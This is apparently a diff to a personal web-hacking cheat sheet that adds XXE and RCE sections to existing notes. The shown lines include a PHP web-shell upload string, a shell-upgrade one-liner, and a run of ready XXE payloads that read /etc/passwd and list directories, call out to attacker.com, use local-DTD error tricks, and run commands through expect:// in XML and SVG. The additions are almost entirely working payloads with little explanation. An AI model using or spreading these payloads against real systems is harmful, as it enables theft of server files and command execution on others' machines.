@@ -11,7 +11,8 @@
 - [cros](#cros)
 - [take sub domain](#takeSub)
 - [Ssrf](#ssrf)
-- 
+- [xxe](#xxe)
+- [rce](#rce)
 
 
 
@@ -930,6 +931,13 @@ GIF89a; <?php system($_GET['cmd']); ?>
 ```
 python3 -c 'import pty;pty.spawn("/bin/sh")'
 ```
+->xml to shell
+```
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://ls"></image>
+</svg>
+```
+
 -
 # shell wget 
 -
@@ -1159,4 +1167,80 @@ refer:https://exam.com</script>
 -link 
 -[youtube](https://youtu.be/FjYZMcj30pw?feature=shared)
 
+# the end
+
+-
+### xxe
+-payalod github[pay](https://github.com/GoSecure/dtd-finder/tree/master/list)
+
+->
+-youtube example xxe to(lfi) to rce
+-link[youtube](https://youtu.be/Gz4iPauycKs?si=kIztGowwNeGQbW9f)
+-xml to lfi but $example;
+```
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+<data>&example;</data>
+```
+```
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
+
+```
+```
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com"/ > ]>
+```
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ELEMENT stockCheck ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<stockCheck>
+    <productId>&file;</productId>
+    <storeId>1</storeId>
+</stockCheck3>
+```
+```
+<!-- Root / -->
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>
+
+<!-- /etc/ -->
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
+```
+```
+<!DOCTYPE foo [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+    <!ENTITY % custom_entity '
+        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+    '>
+    %local_dtd;
+]>
+```
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+    <!ENTITY % ISOamso '
+        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+    '>
+    %local_dtd;
+]>
+<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
+```
+-xml to rce
+```
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "expect://id" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
+```
 
